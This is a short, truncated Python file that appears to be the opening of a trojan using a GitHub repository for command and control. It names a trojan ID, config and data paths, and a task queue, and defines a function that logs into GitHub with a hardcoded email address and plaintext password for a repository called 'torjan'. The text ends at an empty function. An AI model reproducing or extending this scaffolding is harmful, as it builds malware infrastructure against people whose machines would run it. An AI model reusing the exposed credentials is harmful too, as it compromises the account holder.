import json, base64, sys, time, imp, random
import threading, os
import queue

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_module = []
configured = False
task_queue = queue.Queue()


def connect_to_github():
    gh = login(username="asssassing6@gmail.com", password="mustafa0909250601")
    repo = gh.repository("asssassing6@gmail.com", "torjan")
    branch = repo.branch("master")
    return gh, repo, branch


def file_contents():
    
